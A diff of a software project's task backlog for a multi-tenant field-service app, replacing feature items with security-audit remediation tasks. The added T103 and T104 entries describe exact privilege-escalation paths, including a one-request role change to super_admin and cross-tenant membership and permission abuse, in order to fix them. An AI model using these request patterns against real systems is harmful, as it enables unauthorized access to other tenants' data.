-    - Pre-populate invoice with job data (see T030)
-  - **Acceptance Criteria**:
-    - Button visible only on completed jobs without invoices
-    - Invoice created and linked to job
-    - User navigated to invoice for review/send
-
-- [ ] **T030: Auto-populate Invoice from Job Data**
-  - **What**: Pull labor hours, materials, notes, photos into invoice automatically
-  - **Why**: Eliminates manual data entry, ensures nothing is missed
-  - **Confidence**: High - models already have the fields
-  - **Context**: Tech logged "2 hours labor, replaced capacitor $45, customer approved additional work" → invoice has all that
-  - **Implementation**:
-    - Map job.materials → invoice line items
-    - Calculate labor from job time tracking
-    - Include job notes in invoice description
-  - **Acceptance Criteria**:
-    - All job materials appear as line items
-    - Labor calculated from actual time
-    - Job notes/photos accessible from invoice
-
-- [x] **T031: Build A/R Aging Buckets Report** ✓
-  - **What**: Report showing receivables by age: 0-30, 31-60, 61-90, 90+ days
-  - **Why**: Essential for cash flow management - "how much money is stuck and for how long?"
-  - **Confidence**: High - standard accounting report, clear requirements
-  - **Context**: Owner opens report, sees "$5,000 current, $2,000 over 30 days, $500 over 60 days" - knows where to focus collection efforts
-  - **Implementation**:
-    - Query invoices grouped by days since due date
-    - Display totals per bucket
-    - Drill-down to see individual invoices
-  - **Acceptance Criteria**:
-    - Buckets: Current, 1-30, 31-60, 61-90, 90+ days
-    - Click bucket to see invoices in that range
-    - Export to CSV
-
-- [x] **T032: Build "Who Owes What" Report** ✓ COMPLETE
-  - **What**: Customer-centric view of outstanding balances
-  - **Why**: Collection prioritization - focus on customers with largest balances
-  - **Resolution**: Addressed by adding customer filter dropdown to existing A/R Aging Report (T031). The A/R report already has a customer summary endpoint (`/api/v1/reports/ar-aging/customers`) showing per-customer totals, invoice counts, and bucket breakdowns. Filtering by customer on the main report provides the drill-down view.
-  - **Acceptance Criteria**:
-    - ~~Shows all customers with outstanding balances~~ ✓ (A/R report customer summary)
-    - ~~Click customer to see their invoices~~ ✓ (bucket drill-down with customer filter)
-    - ~~Filter by amount threshold~~ ✓ (min_amount query param supported)
-
-### Dashboard - Critical
-
-- [ ] **T033: Add "Jobs Needing Invoice" Dashboard Widget**
-  - **What**: Count and list of completed jobs that haven't been invoiced
-  - **Why**: Prevents revenue leakage - "You have 7 jobs to bill!"
-  - **Confidence**: High - simple query: jobs where status=completed AND no linked invoice
-  - **Context**: Money left on the table is the #1 cash flow killer for small service businesses
-  - **Implementation**:
-    - Dashboard widget showing count
-    - Click to see list of unbilled jobs
-    - Quick action to generate invoice
-  - **Acceptance Criteria**:
-    - Accurate count of completed-but-unbilled jobs
-    - One-click navigation to job list
-    - Prominent placement on dashboard
-
-### Communications - Critical
-
-- [x] **T034: Wire Payment Reminder Automation** ✓ (merged with T043)
-  - **What**: Background job that sends automatic reminders for overdue invoices
-  - **Why**: Getting paid is the business - automated reminders improve collection rate 30-40%
-  - **Implemented**: Background worker (1hr interval), configurable days [7,14,30], escalating tone (friendly→firm→final), email+SMS channels, dedup, manual trigger, Settings UI, Invoice detail history
-
-### Roles - Critical
-
-- [ ] **T035: Create Technician Role**
-  - **What**: Role for field workers with limited access
-  - **Why**: Techs need to see their jobs, add notes/photos, update status - but NOT see customer financials or other techs' schedules
-  - **Confidence**: High - RBAC system exists, just need role definition
-  - **Context**: Tech opens app, sees "Your jobs today: 3", can mark complete, add photos, log time. Cannot see "Customer owes $5,000"
-  - **Permissions to include**:
-    - View assigned jobs only
-    - Update job status
-    - Add job notes and photos
-    - Log time/materials
-  - **Permissions to exclude**:
-    - View other technicians' jobs
-    - View customer financial data
-    - Create/edit customers
-    - Access reports
-  - **Acceptance Criteria**:
-    - Role created with correct permissions
-    - Field-level hiding of financial data
-    - Tech can only see their assignments
+**Notes** — security audit F-3; correctness audit 7.C5. The correctness audit's index list (items 1, 3, 5: `customers (tenant_id, LOWER(email))`, `invoices (tenant_id, status, due_date)`, `jobs (tenant_id, status)` / `(tenant_id, scheduled_start_at)`, all partial on `deleted_at IS NULL`) lands here. Per-tenant numbering itself is T120; the Postgres RLS backstop is T154. Until T139 lands, schema changes go into `001_schema.sql` per CLAUDE.md.
 
 ---
 
-## P1 - High Priority
+#### T103 — Authorize tenant member, invitation and role endpoints; no self-escalation
 
-### Frontend Type Safety
+**Phase**: 1 · **Category**: Security · **Hours**: 6 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-- [x] **T007: Fix `any` Types** ✓ COMPLETE
-  - Replaced 50+ `any` types with proper TypeScript types
-  - Created `src/utils/error.ts` utility for type-safe error handling
-  - Fixed type definition files: template.ts, chart.ts, recurring/types.ts, calendar/types.ts
-  - Fixed page components: CustomerDetailPage, InvoiceDetailPage, QuoteDetailPage, JobDetailPage, etc.
-  - Fixed components: FilterBar.tsx, TemplatePreview.tsx, Calendar.tsx, RecurringForm.tsx, etc.
-  - Fixed stores: tenantStore.ts with proper error handling
-  - Fixed all test mocks with proper TypeScript interfaces (MockCardElementProps, etc.)
+**What it is** — Every `/tenants/:id/*` route checks that the caller is an active member of `:id` with a sufficient role, a caller can never grant a role at or above their own, and `super_admin` can never be assigned through the tenant API.
 
-- [x] **T008: Remove @ts-nocheck Directives** ✓ COMPLETE
-  - Removed `@ts-nocheck` from both files:
-    - [x] `frontend/src/routes/index.tsx` - Removed 35+ `@ts-expect-error` comments from dynamic imports
-    - [x] `frontend/src/utils/performance.ts` - Added proper browser API type declarations
-  - Fixed `loadable()` function type signature to handle dynamic import union types
-  - Added browser API interfaces: `PerformanceEventTiming`, `LayoutShiftEntry`, `ExtendedPerformanceObserverInit`, `DocumentWithPrerendering`
-  - All type errors resolved, type-check passes
+**What it does** — Add a `RequireTenantRole(minHierarchy)` middleware: caller must be an active admin-or-higher member of `c.Param("id")`, and `:id` must equal the tenant in context (the pattern `billing_handler.go:323-345` already uses). Apply it to the member and invitation routes (`tenants_routes.go:38-67`, which today have only `RequireAuth()` and a "checked in handler" comment), to `GetTenant`/`UpdateTenant` (`tenant_handler.go:100,144`) and to the membership routes (`membership_handler.go:63,109,182,234` behind `membership_routes.go:16-36`). In `tenant_service.go:286-323` (AddMember) and `:347-362` (UpdateMemberRole), reject a `role_id` whose hierarchy is at or above the caller's and refuse super_admin outright. Same checks for `invitation_handler.go:46,102,135,172`. Return generic errors from AddMember (it currently echoes "user not found with email: X").
 
-- [x] **T009: Enable Strict TypeScript Checks** ✓ COMPLETE
-  - Enabled `noUnusedLocals: true` and `noUnusedParameters: true` in tsconfig.json
-  - Fixed 17 issues:
-    - Removed 7 unused `React` imports (modern JSX transform doesn't need them)
-    - Removed unused variables: `_chartRef`, `_handleItemsChange`, `_bulkAssignMutation`, `_formatValue`, `_navigate`, `_API_BASE_URL`
-    - Removed unused `_offlineFallback` Route (dead code in service-worker.ts)
-    - Prefixed unused callback parameters with `_` (TypeScript convention)
-  - Type-check passes, dead code will now be caught at compile time
+**Why we need it** — Today `PUT /api/v1/tenants/{myTenant}/members/{myUserId}/role {"role_id":"…0001"}` makes any user super_admin, `POST /tenants/{victim}/members` adds the caller to any tenant whose UUID they know, `RemoveMember` kicks anyone out of any tenant, and any tenant admin can rename, re-slug or change the subscription tier of another tenant.
 
-### Backend Observability
-
-- [x] **T006: Structured JSON Logging** ✓ COMPLETE
-  - Implemented custom logging client at `pkg/clients/logging/` with multiple providers (Mock, BetterStack, CloudWatch, Loki)
-  - Added global logger pattern with `SetDefault()` and `L()` functions
-  - Migrated all `fmt.Printf` and `log.Printf` calls to structured logging
-  - JSON format in production, human-readable in development
-  - Standard fields: timestamp, level, message, request_id, user_id, tenant_id
-  - Only exceptions: config/config.go (circular import), logging package files (can't import itself)
-
-- [x] **T010: Apply Error Tracking Middleware** ✓ ALREADY COMPLETE
-  - **Analysis**: `RecoveryMiddleware` in `error_handler.go` already handles this
-  - **What it does**:
-    - Captures panics and sends to error tracking (Sentry)
-    - Adds full request context: method, path, query, client IP
-    - Attaches user context when available
-    - Applied first in middleware chain in `routes.go`
-  - **Why HTTPMiddleware not needed**: No application code calls `CaptureException` directly outside of panic recovery. The existing implementation covers the critical use case.
-
-### Infrastructure
-
-- [x] **Dependency Vulnerability Scanning**
-  - **What**: Add Dependabot or Snyk to scan for vulnerable dependencies
-  - **Why**: Go modules and npm packages need continuous security monitoring
-  - **Expected Result**: Automatic PRs for security updates
-  - **Acceptance Criteria**:
-    - Dependabot configured for Go and npm ✓
-    - Weekly security scans ✓
-    - Critical vulnerabilities create blocking issues
-    - Auto-merge for patch-level security updates ✓
-
-- [x] **T012: Bundle Size Monitoring in CI** ✓ COMPLETE
-  - **What**: Bundle analysis in CI pipeline, pre-push hooks, and release script with size limits
-  - **Why**: Prevent frontend bundle bloat over time
-  - **Implementation**:
-    - `analyze-bundle.cjs` generates markdown report with chunk breakdown in CI mode
-    - `checks.yml` runs bundle check on push to master, adds report to GitHub Step Summary
-    - `deploy-release.yml` runs bundle check before deploy, adds report to Step Summary
-    - `scripts/release.sh` validates bundle size before creating release
-    - Pre-push hook validates bundle size locally before push
-  - **Thresholds**: Warning at 500KB gzipped, failure at 750KB gzipped, per-chunk budgets
-
-### Frontend Features
-
-- [x] **T019: Integrate Calendar View for Job Scheduling** ✓ COMPLETE
-  - **What**: Wire up the existing Calendar components to display and manage jobs
-  - **Why**: Calendar components are 100% complete but not integrated - critical for service business scheduling
-  - **Implementation**:
-    - Created `JobCalendarPage` at `/jobs/calendar` route
-    - Uses existing `GET /v1/jobs/scheduled?start=&end=` backend endpoint
-    - Converts Job data to calendar events with status color mapping
-    - Click event navigates to job detail page
-    - Drag-and-drop disabled for now (see T027)
-  - **Files Created/Modified**:
-    - `frontend/src/pages/Jobs/JobCalendarPage.tsx` - New calendar page component
-    - `frontend/src/services/jobService.ts` - Added `getScheduledJobs()` method
-    - `frontend/src/components/calendar/Calendar.tsx` - Disabled drag-drop
-    - `frontend/src/components/calendar/types.ts` - Added status mapping function
-    - `frontend/src/routes/index.tsx` - Added `/jobs/calendar` route
-
-- [x] **T024: Full Sentry Integration (Frontend + Backend)** ✓ COMPLETE
-  - Added GlitchTip (Sentry-compatible) to docker-compose with separate Postgres, Celery worker
-  - Initialized Sentry SDK in `main.tsx` with `initErrorTracking()`, wrapped App in `ErrorBoundary`
-  - User context set on login/logout/checkAuth via `setUser()` in authStore
-  - Backend already wired via factory pattern (`errortracking.Client`) — just needs DSN
-  - Optional: no DSN = mock/no-op, deployment never blocked
-  - Source map upload deferred to T101
-
-### Email Infrastructure
-
-- [ ] **Email Rate Limiting for SES**
-  - **What**: Implement token bucket rate limiter for SES sandbox limits
-  - **Why**: SES sandbox limit is 14 emails/second; need to prevent throttling
-  - **Expected Result**: Emails queued and sent within rate limits
-  - **Acceptance Criteria**:
-    - Configurable tokens per second (default: 14)
-    - Automatic queuing when limit reached
-    - Metrics for queue depth and wait times
-    - Graceful handling of rate limit errors
-
-- [ ] **Email Retry Logic with Exponential Backoff**
-  - **What**: Add retry mechanism for transient email failures
-  - **Why**: Network issues and temporary provider errors cause lost emails
-  - **Expected Result**: Transient failures automatically retried
-  - **Acceptance Criteria**:
-    - Max 3 retries with exponential backoff
-    - Base delay: 1 second, max delay: 30 seconds
-    - Jitter added to prevent thundering herd
-    - Non-retryable errors (invalid email) fail immediately
-    - Failed emails logged with reason
-
-### Logging & Observability
-
-- [ ] **Request Correlation IDs**
-  - **What**: Add unique request ID to all log entries for tracing
-  - **Why**: Cannot trace requests across services/logs currently
-  - **Expected Result**: Every request has traceable ID in all logs
-  - **Acceptance Criteria**:
-    - X-Request-ID header generated if not provided
-    - ID propagated to all service calls
-    - ID included in all log entries
-    - ID returned in error responses
-    - Frontend includes ID in error reports
-
-- [x] **Structured JSON Logging** ✓ COMPLETE (See T006)
-
-- [ ] **Expanded Health Checks**
-  - **What**: Add health checks for all dependencies (DB, Redis, S3)
-  - **Why**: Current /health only checks if server is running
-  - **Expected Result**: Comprehensive health status with dependency details
-  - **Acceptance Criteria**:
-    - `/health/live` - Is the server running? (for k8s liveness)
-    - `/health/ready` - Are all dependencies healthy? (for k8s readiness)
-    - Individual checks: database, redis, s3, stripe
-    - Response includes latency for each check
-    - Degraded state if non-critical dependency unhealthy
-
-- [ ] **HTTP Request Metrics**
-  - **What**: Add Prometheus metrics for HTTP requests
-  - **Why**: Need visibility into request latency and error rates
-  - **Expected Result**: Prometheus-compatible metrics endpoint
-  - **Acceptance Criteria**:
-    - `http_requests_total` counter by method, path, status
-    - `http_request_duration_seconds` histogram
-    - `http_requests_in_flight` gauge
-    - Metrics exposed at `/metrics`
-
-### Security
-
-- [ ] **Comprehensive Input Validation**
-  - **What**: Add request validators for all API endpoints
-  - **Why**: Inconsistent validation across endpoints
-  - **Expected Result**: All inputs validated with clear error messages
-  - **Acceptance Criteria**:
-    - Use `go-playground/validator` consistently
-    - Custom validators for business rules (email format, phone, etc.)
-    - Standardized validation error response format
-    - Validation rules documented
-
-### Testing
-
-- [ ] **Integration Tests for Critical Workflows**
-  - **What**: Add integration tests for 5 critical user workflows
-  - **Why**: Only 9 integration tests exist currently
-  - **Expected Result**: End-to-end testing of critical paths
-  - **Workflows to test**:
-    1. User registration → email verification → login
-    2. Create customer → create job → complete job
-    3. Create quote → convert to invoice → mark paid
-    4. Stripe payment method → subscription change
-    5. Team member invite → accept → permissions check
-  - **Acceptance Criteria**:
-    - Tests run against real database (test container)
-    - Tests clean up after themselves
-    - Tests run in CI pipeline
-    - <30 second execution time
-
-- [x] **E2E Testing Setup (Cypress/Playwright)**
-  - **What**: Set up end-to-end testing framework for frontend
-  - **Why**: No E2E tests exist; critical flows untested
-  - **Expected Result**: Automated browser tests for critical flows
-  - **Acceptance Criteria**:
-    - Framework installed and configured ✓
-    - Tests for: login, create customer, create job ✓ (auth, customers, jobs, invoices, quotes, payments)
-    - Tests run in CI with video recording
-    - Test environment seeded with data
-
-### Frontend Cleanup
-
-- [x] **Remove Console.log Statements** ✓ VERIFIED COMPLETE
-  - **Status**: Production build already strips console.log via Terser
-  - **Config**: `frontend/config/optimization.ts:64` - `drop_console: process.env.NODE_ENV === 'production'`
-  - **Note**: 189 console statements exist in source but are removed in production build
-
-- [ ] **Fix @ts-nocheck in Routes** (MOVED TO P1 - Type Safety)
-  - See P1 section for details
-
-### CRM - High Priority
-
-- [ ] **T036: Add Manual Call Log Entry**
-  - **What**: Form to log phone calls with customers (date, duration, notes, outcome)
-  - **Why**: Team coordination - prevents two people calling same customer, tracks communication history
-  - **Confidence**: High - simple CRUD with form
-  - **Context**: "Called Mrs. Smith about her quote, left voicemail, will call back tomorrow" - everyone on team can see this
-  - **Implementation**:
-    - Add CallLog model (customer_id, user_id, timestamp, duration, notes, outcome)
-    - Add form on customer detail page
-    - Display in customer activity timeline
-  - **Acceptance Criteria**:
-    - Can log calls from customer detail page
-    - Call appears in customer timeline
-    - Shows who made the call and when
-
-- [ ] **T037: Auto-log System Messages to Customer Activity**
-  - **What**: Automatically create activity log entries when system sends communications
-  - **Why**: No more "did the quote go out?" questions - everything is logged
-  - **Confidence**: High - hook into existing email/SMS send functions
-  - **Context**: Quote sent → activity log shows "Quote #123 sent via email". Invoice paid → "Payment received $500"
-  - **Implementation**:
-    - Hook email service to log sends
-    - Hook SMS service to log sends
-    - Log payment events
-    - Log quote/invoice status changes
-  - **Acceptance Criteria**:
-    - All outbound communications logged
-    - All payment events logged
-    - All status changes logged
-    - Shows in customer timeline
-
-### Scheduling - High Priority
-
-- [ ] **T038: Add Technician Availability Management UI**
-  - **What**: UI for techs to set working hours and for managers to view availability
-  - **Why**: Dispatchers need to know who's available when scheduling
-  - **Confidence**: Medium - unclear if this is simple working hours or complex shift patterns
-  - **Context**: "Mike works M-F 8-5, Sarah works T-Sat 7-4" - dispatcher sees this when assigning
-  - **Implementation**:
-    - Add availability settings per technician
-    - Display availability on scheduling calendar
-    - Warn when scheduling outside available hours
-  - **Acceptance Criteria**:
-    - Techs can set their working hours
-    - Dispatchers can view tech availability
-    - Warning when scheduling outside hours
-
-- [ ] **T039: Create Emergency Job Insertion Workflow**
-  - **What**: Special flow for high-priority emergency jobs that may bump existing appointments
-  - **Why**: Pipe burst, AC died in summer - customer needs someone TODAY
-  - **Confidence**: Medium - exact workflow unclear (simple priority flag vs complex rescheduling)
-  - **Context**: Emergency call comes in → mark as emergency → system helps find slot, may bump existing job
-  - **Implementation**:
-    - Add "emergency" priority level
-    - Show available slots accounting for travel time
-    - Option to bump existing non-emergency jobs
-    - Notify affected customers if bumped
-  - **Acceptance Criteria**:
-    - Can mark job as emergency
-    - System suggests available slots
-    - Can reschedule existing jobs with notification
-
-- [ ] **T040: Add Auto-notify on Emergency Insertion**
-  - **What**: Automatically notify customer and tech when emergency job is inserted
-  - **Why**: Keep everyone informed when schedules change
-  - **Confidence**: High - straightforward notification trigger
-  - **Context**: Emergency bumps existing job → affected customer gets "We need to reschedule" message
-  - **Implementation**:
-    - Trigger notification when job bumped
-    - Send to affected customer
-    - Send to affected technician
-  - **Acceptance Criteria**:
-    - Affected parties notified automatically
-    - Clear message about rescheduling
-    - Option to call instead of auto-message
-
-- [ ] **T099: Add Tenant Timezone Support for Conflict Detection**
-  - **What**: Use tenant timezone and business hours from org settings in conflict detection
-  - **Why**: Business-hours validation currently compares UTC times against hardcoded 8AM–6PM, producing false conflicts (e.g. 1:24 PM local flagged as outside hours)
-  - **Confidence**: High - well-understood problem, standard timezone handling
-  - **Context**: `detector.go` business-hours check is currently disabled with a TODO. Frontend sends `datetime-local` values which are in the user's local time. Backend needs tenant timezone to convert correctly before comparing. Depends on T100 for the stored settings.
-  - **Implementation**:
-    - Read tenant timezone and business hours from DB (set via T100)
-    - Pass tenant timezone through conflict check flow
-    - Convert schedule times to tenant-local time before business-hours comparison
-    - Use configurable business hours instead of hardcoded 8–18
-    - Re-enable `checkBusinessHours` in `detector.go`
-  - **Acceptance Criteria**:
-    - Business-hours conflicts use tenant timezone, not UTC
-    - Business-hours window uses tenant-configured hours, not hardcoded
-    - No false positives for schedules within local business hours
-    - Default to UTC / 8AM–6PM if no settings configured
-
-- [ ] **T100: Add Business Hours & Timezone to Org Settings**
-  - **What**: Let org admins configure their timezone and business hours from the org settings page
-  - **Why**: Business hours are hardcoded (8AM–6PM Mon–Fri) and timezone is not stored, so conflict detection can't accurately flag after-hours or weekend scheduling
-  - **Confidence**: High - standard settings CRUD with well-known IANA timezone list
-  - **Context**: Org settings page already exists. Need to add timezone picker (IANA, e.g. `America/New_York`) and business-hours editor (start/end hour per day, plus which days are work days). T099 depends on this to re-enable business-hours conflict checks.
-  - **Implementation**:
-    - Add `timezone`, `business_hours_start`, `business_hours_end`, `business_days` columns to `tenants` table
-    - Add backend API endpoints to get/update org settings (or extend existing)
-    - Add timezone dropdown to org settings UI (searchable IANA timezone list)
-    - Add business hours editor (start time, end time, work days checkboxes)
-    - Default: UTC, 8:00 AM – 6:00 PM, Monday–Friday
-  - **Acceptance Criteria**:
-    - Admin can set timezone from a searchable dropdown
-    - Admin can set business start/end hours
-    - Admin can toggle which days are business days
-    - Settings persist and are readable by conflict detection (T099)
-    - Sensible defaults when no settings configured
-
-### Quoting - High Priority
-
-- [ ] **T041: Implement Quote Auto Follow-ups**
-  - **What**: Automated email sequence for quotes that haven't been responded to
-  - **Why**: Consistent follow-up improves close rate by 20-30%
-  - **Confidence**: Medium - cadence and messaging unclear
-  - **Context**: Quote sent Monday, no response → Day 3: "Following up" → Day 7: "Any questions?" → Day 14: "Quote expiring soon"
-  - **Implementation**:
-    - Background job to check quote ages
-    - Send follow-up at configurable intervals
-    - Track follow-ups sent
-    - Stop when quote accepted/declined
-  - **Acceptance Criteria**:
-    - Follow-ups sent automatically
-    - Configurable timing
-    - No follow-ups after response
-    - Track follow-up history
-
-- [ ] **T042: Build Follow-up Queue UI**
-  - **What**: List view of quotes needing manual follow-up
-  - **Why**: Organized view for sales efforts - "Call these 5 customers today"
-  - **Confidence**: High - straightforward list with filters
-  - **Context**: Manager opens queue, sees quotes sorted by age/value, assigns follow-up tasks
-  - **Implementation**:
-    - List quotes pending response
-    - Sort by age, value, customer
-    - Show last contact date
-    - Quick actions (call logged, email sent)
-  - **Acceptance Criteria**:
-    - Shows all pending quotes
-    - Sortable/filterable
-    - Log follow-up actions
-
-### Invoicing - High Priority
-
-- [x] **T043: Wire Payment Reminder Notifications** ✓ (merged with T034)
-  - **What**: Connect payment notification models to actual email/SMS sending
-  - **Implemented**: Merged into T034 — full email+SMS delivery via email.Client.Send() and sms.Client.SendNotification(), channel resolved from customer PreferredContactMethod and DoNot flags, delivery status tracked in payment_reminders table
-
-- [ ] **T044: Build Collections Dashboard**
-  - **What**: Unified view for managing overdue accounts
-  - **Why**: Central place for collection efforts
-  - **Confidence**: Medium - could be simple list or complex workflow tool
-  - **Context**: Collections person opens dashboard, sees all overdue accounts, prioritizes calls
-  - **Implementation**:
-    - List overdue invoices
-    - Show customer contact info
-    - Track collection activities
-    - Log promises-to-pay
-  - **Acceptance Criteria**:
-    - All overdue accounts visible
-    - Contact info accessible
-    - Can log collection activities
-
-### Dashboard - High Priority
-
-- [ ] **T045: Add Aging Quotes Dashboard Widget**
-  - **What**: Widget showing count of quotes older than X days
-  - **Why**: Quick visibility into stale pipeline
-  - **Confidence**: High - simple count query
-  - **Context**: "12 quotes over 7 days old" - prompts follow-up action
-  - **Implementation**:
-    - Query quotes by age
-    - Display count in widget
-    - Click to see list
-  - **Acceptance Criteria**:
-    - Shows count of aging quotes
-    - Configurable threshold (7, 14, 30 days)
-    - Links to quote list
-
-- [ ] **T046: Add Follow-up Queue Dashboard Widget**
-  - **What**: Widget showing items needing follow-up today
-  - **Why**: Daily action list at a glance
-  - **Confidence**: High - simple count with link
-  - **Context**: "8 items need follow-up today" - click to see list
-  - **Implementation**:
-    - Count quotes + invoices needing follow-up
-    - Display on dashboard
-    - Link to follow-up queue
-  - **Acceptance Criteria**:
-    - Accurate count
-    - Links to queue
-
-- [ ] **T047: Build "Stuck Work" Report**
-  - **What**: Report showing work stuck at various stages
-  - **Why**: Catches things falling through cracks
-  - **Confidence**: Medium - "stuck" definition needs clarification
-  - **Context**: Three lists: completed-not-invoiced, quotes-not-followed-up, overdue-not-contacted
-  - **Implementation**:
-    - Query for each "stuck" category
-    - Display counts and lists
-    - Quick actions to unstick
-  - **Acceptance Criteria**:
-    - Shows completed jobs without invoices
-    - Shows quotes without follow-up
-    - Shows overdue invoices without recent contact
-
-### Communications - High Priority
-
-- [ ] **T048: Add Appointment Confirmation Emails**
-  - **What**: Send confirmation email when job is scheduled
-  - **Why**: Sets customer expectations, reduces no-shows
-  - **Confidence**: High - standard notification
-  - **Context**: Job scheduled → "Your appointment is confirmed for Feb 5 at 2pm"
-  - **Implementation**:
-    - Trigger on job scheduled
-    - Template with job details
-    - Include reschedule/cancel link
-  - **Acceptance Criteria**:
-    - Email sent when job scheduled
-    - Contains date, time, service type
-    - Professional template
-
-- [ ] **T049: Add Appointment Reminder Emails/SMS**
-  - **What**: Send reminders before scheduled appointments
-  - **Why**: Reduces no-shows by 25-30%
-  - **Confidence**: High - standard pattern
-  - **Context**: Day before: "Reminder: technician arriving tomorrow 2pm". Morning of: "Tech arriving in 2 hours"
-  - **Implementation**:
-    - Background job to check upcoming jobs
-    - Send at configurable intervals (24hr, 2hr)
-    - Support both email and SMS
-  - **Acceptance Criteria**:
-    - Reminders sent automatically
-    - Configurable timing
-    - Customer can opt out
-
-- [ ] **T050: Add "Tech on the Way" Manual Trigger**
-  - **What**: Button for tech to notify customer they're en route
-  - **Why**: Customer knows to be ready, improves experience
-  - **Confidence**: High - simple button + notification
-  - **Context**: Tech clicks button → customer gets "Your technician is on the way!"
-  - **Implementation**:
-    - Button on tech's job view
-    - Send SMS to customer
-    - Log in job activity
-  - **Acceptance Criteria**:
-    - One-click send
-    - SMS delivered to customer
-    - Logged in job history
-
-- [ ] **T051: Implement Quote Follow-up Email Sequence**
-  - **What**: Multi-email sequence for quote follow-up
-  - **Why**: Automated nurturing of pending quotes
-  - **Confidence**: Medium - sequence rules need definition
-  - **Context**: Day 3: check-in, Day 7: address concerns, Day 14: expiration warning
-  - **Implementation**:
-    - Define email templates for each touch
-    - Schedule sends based on quote age
-    - Stop on response
-  - **Acceptance Criteria**:
-    - Sequence runs automatically
-    - Templates customizable
-    - Stops when quote resolved
-
-### Roles - High Priority
-
-- [ ] **T052: Create Dispatcher Role**
-  - **What**: Role for office staff who manage scheduling
-  - **Why**: Dispatchers need schedule access but not financial visibility
-  - **Confidence**: High - clear permission boundaries
-  - **Context**: Dispatcher can see all jobs, assign techs, reschedule - but can't see invoice amounts or customer payment history
-  - **Permissions to include**:
-    - View all jobs
-    - Create/edit job schedules
-    - Assign technicians
-    - View customer contact info
-  - **Permissions to exclude**:
-    - View invoice amounts
-    - View payment history
-    - Access financial reports
-    - Modify pricing
-  - **Acceptance Criteria**:
-    - Role created with correct permissions
-    - Financial data hidden from dispatchers
+**Notes** — security audit F-1 and F-5 (plus the AddMember enumeration in F-12). Pairs with T104: F-1 is the write path, F-2 is why a role in one tenant counts everywhere.
 
 ---
 
-## P2 - Medium Priority
+#### T104 — Evaluate permissions per tenant
 
-### Infrastructure
+**Phase**: 1 · **Category**: Security · **Hours**: 4 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: none
 
-- [ ] **Infrastructure as Code (Terraform)**
-  - **What**: Add Terraform for cloud infrastructure management
-  - **Why**: Infrastructure changes should be versioned and reproducible
-  - **Expected Result**: All infrastructure defined in code
-  - **Acceptance Criteria**:
-    - Terraform modules for: database, redis, S3
-    - State stored in S3 with locking
-    - Separate workspaces for staging/production
-    - CI/CD integration for terraform apply
+**What it is** — Permission checks use only the caller's role in the current tenant, with a separate explicit platform-admin path, instead of the union of every role the user holds anywhere.
 
-### Email Infrastructure
+**What it does** — Change `CheckPermission(ctx, userID, perm)` (`services/permissions/checker.go:43`, `middleware/permissions.go:133`) to `CheckPermission(ctx, userID, tenantID, perm)` and resolve the role from `tenant_users` for that tenant only; drop the UNION over `user_roles` + every `tenant_users` row in `permission_repository.go:25-58`. Key the Redis cache by `user:tenant` (`checker.go:211`). Run `RequireTenant` before `RequirePermission` on every business route. `RequireTenant` (`middleware/tenant.go:73-110`) must verify membership of whatever `X-Tenant-ID` the client sends; it currently trusts the header first. Remove the dead `jwt_tenant_id` read (`tenant.go:90`).
 
-- [ ] **Redis-Backed Email Queue**
-  - **What**: Implement async email processing with persistence
-  - **Why**: Decouple email sending from request handling
-  - **Expected Result**: Emails queued and processed asynchronously
-  - **Acceptance Criteria**:
-    - Job priorities: low, normal, high, critical
-    - Job statuses: pending, processing, completed, failed, retrying
-    - Dead letter queue for failed emails
-    - Worker pool with configurable concurrency
-    - Scheduled sends (future dated emails)
-    - Dashboard for queue monitoring
+**Why we need it** — Anyone can `POST /api/v1/tenants` (`tenants_routes.go:20`, no permission needed) and become `admin` of their new tenant (`tenant_service.go:119`); admin holds every permission except four (`001_schema.sql:1266-1269`), and those permissions then apply on every route for every tenant. A technician in tenant A who creates tenant B becomes an admin in A.
 
-- [ ] **Email Batch Sending**
-  - **What**: Implement concurrent batch operations for bulk emails
-  - **Why**: Efficient handling of newsletters, notifications
-  - **Expected Result**: Bulk emails sent with controlled concurrency
-  - **Acceptance Criteria**:
-    - Configurable concurrency limit (default: 10)
-    - Aggregate results with success/failure counts
-    - Progress tracking for large batches
-    - Cancellation support
-
-### Logging & Observability
-
-- [x] **T017: Query Performance Monitoring** ✓ COMPLETE
-  - Custom GORM logger (`pkg/database/logger.go`) implements `logger.Interface`
-  - Every query timed: slow queries (>=100ms) logged at WARN, critical (>=1s) at ERROR
-  - Prometheus metrics: `db_query_duration_seconds` histogram, `db_queries_total` counter, `db_query_errors_total` counter (all with operation/table labels)
-  - Connection pool metrics collector (`pkg/database/pool_metrics.go`): 6 gauges for open/idle/in-use/max connections, wait count, wait duration
-  - Configurable via env vars: `DB_SLOW_QUERY_THRESHOLD`, `DB_QUERY_ALERT_THRESHOLD`, `DB_LOG_ALL_QUERIES`
-  - Thread-safe deferred metrics wiring via `SetMetricsClient()` (handles init order: DB before metrics)
-
-- [ ] **Business Metrics Dashboard**
-  - **What**: Track business metrics (customers, jobs, revenue)
-  - **Why**: Need visibility into business health
-  - **Expected Result**: Prometheus metrics for business KPIs
-  - **Acceptance Criteria**:
-    - Metrics: customers_total, jobs_created, jobs_completed
-    - Metrics: invoices_generated, revenue_total
-    - Metrics: quotes_sent, quotes_converted
-    - Grafana dashboard template provided
-
-### Testing
-
-- [ ] **Email Service Tests**
-  - **What**: Add unit tests for email sending service
-  - **Why**: Email sending currently untested
-  - **Expected Result**: Full test coverage for email service
-  - **Acceptance Criteria**:
-    - Tests for all email types (welcome, reset, verification)
-    - Mock provider used in tests
-    - Template rendering tested
-    - Error handling tested
-
-- [ ] **Stripe/Payment Flow Tests**
-  - **What**: Add tests for payment processing flows
-  - **Why**: Critical business logic untested
-  - **Expected Result**: Payment flows tested with Stripe test mode
-  - **Acceptance Criteria**:
-    - Setup intent creation tested
-    - Payment method attachment tested
-    - Subscription creation/change tested
-    - Webhook handling tested
-
-- [ ] **Frontend Service Layer Tests**
-  - **What**: Add tests for frontend services and API calls
-  - **Why**: Service layer has minimal test coverage
-  - **Expected Result**: Service methods tested with mocked API
-  - **Acceptance Criteria**:
-    - All membershipApi methods tested
-    - All billingApi methods tested
-    - Error handling tested
-    - Loading states tested
-
-- [ ] **Frontend Store Tests**
-  - **What**: Add tests for Zustand store actions
-  - **Why**: Store logic untested
-  - **Expected Result**: Store actions tested in isolation
-  - **Acceptance Criteria**:
-    - membershipStore actions tested
-    - billingStore actions tested
-    - State transitions verified
-    - Error states tested
-
-### Frontend Cleanup
-
-- [ ] **Audit useCallback/useMemo Usage**
